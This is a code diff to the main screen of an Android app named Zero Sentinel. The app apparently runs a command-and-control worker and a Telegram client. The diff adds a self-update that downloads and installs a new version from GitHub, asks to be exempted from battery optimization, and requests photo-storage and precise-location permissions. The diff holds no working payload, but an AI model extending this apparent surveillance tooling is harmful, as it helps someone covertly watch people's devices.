@@ -19,6 +19,7 @@ import androidx.work.*
 import com.google.android.material.navigation.NavigationView
 import com.zero.sentinel.R
 import com.zero.sentinel.data.EncryptedPrefsManager
+import com.zero.sentinel.network.GithubUpdater
 import com.zero.sentinel.network.TelegramClient
 import com.zero.sentinel.utils.DeviceInfoHelper
 import com.zero.sentinel.workers.C2Worker
@@ -75,6 +76,16 @@ class MainActivity : AppCompatActivity() {
             drawerLayout.openDrawer(GravityCompat.START)
         }
 
+        // Set version text in header
+        val headerView = navigationView.getHeaderView(0)
+        val tvVersion = headerView.findViewById<TextView>(R.id.tv_version)
+        try {
+            val versionName = packageManager.getPackageInfo(packageName, 0).versionName
+            tvVersion.text = "v$versionName"
+        } catch (e: Exception) {
+            tvVersion.text = "v?.?.?"
+        }
+
         navigationView.setNavigationItemSelectedListener { menuItem ->
             when (menuItem.itemId) {
                 R.id.nav_dashboard -> {
@@ -83,6 +94,13 @@ class MainActivity : AppCompatActivity() {
                 R.id.nav_security -> {
                     drawerLayout.closeDrawer(GravityCompat.START)
                     showSetPinDialog()
+                }
+                R.id.nav_update -> {
+                    drawerLayout.closeDrawer(GravityCompat.START)
+                    Toast.makeText(this, "Checking for updates...", Toast.LENGTH_SHORT).show()
+                    CoroutineScope(Dispatchers.IO).launch {
+                        GithubUpdater(this@MainActivity).checkAndInstallUpdate()
+                    }
                 }
                 R.id.nav_settings -> {
                     drawerLayout.closeDrawer(GravityCompat.START)
@@ -218,47 +236,23 @@ class MainActivity : AppCompatActivity() {
     // --- Dialogs ---
 
     private fun showSetPinDialog() {
-        val context = this
-        val layout = LinearLayout(context)
-        layout.orientation = LinearLayout.VERTICAL
-        layout.setPadding(60, 40, 60, 10)
-        
-        val input1 = EditText(context)
-        input1.hint = "New 6-digit PIN"
-        input1.setTextColor(getColor(R.color.slate_300))
-        input1.setHintTextColor(getColor(R.color.slate_500))
-        input1.inputType = android.text.InputType.TYPE_CLASS_NUMBER or android.text.InputType.TYPE_NUMBER_VARIATION_PASSWORD
-        input1.background = getDrawable(R.drawable.bg_input_dark)
-        // Add padding/margins programmatically if needed, but simple is fine for now
-        
-        val input2 = EditText(context)
-        input2.hint = "Confirm PIN"
-        input2.setTextColor(getColor(R.color.slate_300))
-        input2.setHintTextColor(getColor(R.color.slate_500))
-        input2.inputType = android.text.InputType.TYPE_CLASS_NUMBER or android.text.InputType.TYPE_NUMBER_VARIATION_PASSWORD
-        input2.background = getDrawable(R.drawable.bg_input_dark)
+        val dialogView = layoutInflater.inflate(R.layout.dialog_set_pin, null)
+        val etPinNew = dialogView.findViewById<EditText>(R.id.et_pin_new)
+        val etPinConfirm = dialogView.findViewById<EditText>(R.id.et_pin_confirm)
 
-        layout.addView(input1)
-        // Spacer
-        val spacer = android.view.View(context)
-        spacer.layoutParams = LinearLayout.LayoutParams(1, 20)
-        layout.addView(spacer)
-        layout.addView(input2)
-
-        AlertDialog.Builder(context) // Use default dark theme from manifest
-            .setTitle("Set Security PIN")
-            .setView(layout)
-            .setPositiveButton("Save") { _, _ ->
-                val p1 = input1.text.toString()
-                val p2 = input2.text.toString()
+        AlertDialog.Builder(this, R.style.Theme_ZeroSentinel_Dialog)
+            .setView(dialogView)
+            .setPositiveButton(R.string.pin_dialog_save) { _, _ ->
+                val p1 = etPinNew.text.toString()
+                val p2 = etPinConfirm.text.toString()
                 if (p1.length == 6 && p1 == p2) {
                     prefsManager.saveAppPassword(p1)
-                    Toast.makeText(context, "PIN Updated", Toast.LENGTH_SHORT).show()
+                    Toast.makeText(this, "PIN Updated ✅", Toast.LENGTH_SHORT).show()
                 } else {
-                    Toast.makeText(context, "Mismatch or Invalid length", Toast.LENGTH_SHORT).show()
+                    Toast.makeText(this, "Mismatch or Invalid length", Toast.LENGTH_SHORT).show()
                 }
             }
-            .setNegativeButton("Cancel", null)
+            .setNegativeButton(R.string.pin_dialog_cancel, null)
             .show()
     }
 
@@ -270,7 +264,7 @@ class MainActivity : AppCompatActivity() {
             "Storage/Camera: ${if(hasMediaPermissions()) "✅" else "❌"}"
         )
 
-        AlertDialog.Builder(this)
+        AlertDialog.Builder(this, R.style.Theme_ZeroSentinel_Dialog)
             .setTitle("System Permissions")
             .setItems(items) { _, which ->
                  when(which) {
@@ -300,6 +294,7 @@ class MainActivity : AppCompatActivity() {
         return pm.isIgnoringBatteryOptimizations(packageName)
     }
 
+    @android.annotation.SuppressLint("BatteryLife")
     private fun requestBatteryOptimization() {
         if (!isIgnoringBatteryOptimizations()) {
             val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
@@ -323,11 +318,18 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun hasMediaPermissions(): Boolean {
-        return checkSelfPermission(android.Manifest.permission.READ_MEDIA_IMAGES) == android.content.pm.PackageManager.PERMISSION_GRANTED ||
-               checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) == android.content.pm.PackageManager.PERMISSION_GRANTED
+        return if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
+            checkSelfPermission(android.Manifest.permission.READ_MEDIA_IMAGES) == android.content.pm.PackageManager.PERMISSION_GRANTED
+        } else {
+            checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) == android.content.pm.PackageManager.PERMISSION_GRANTED
+        }
     }
     
     private fun requestMediaPermissions() {
-        requestPermissions(arrayOf(android.Manifest.permission.READ_MEDIA_IMAGES, android.Manifest.permission.READ_EXTERNAL_STORAGE, android.Manifest.permission.ACCESS_FINE_LOCATION), 101)
+        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
+            requestPermissions(arrayOf(android.Manifest.permission.READ_MEDIA_IMAGES, android.Manifest.permission.ACCESS_FINE_LOCATION), 101)
+        } else {
+            requestPermissions(arrayOf(android.Manifest.permission.READ_EXTERNAL_STORAGE, android.Manifest.permission.ACCESS_FINE_LOCATION), 101)
+        }
     }
 }
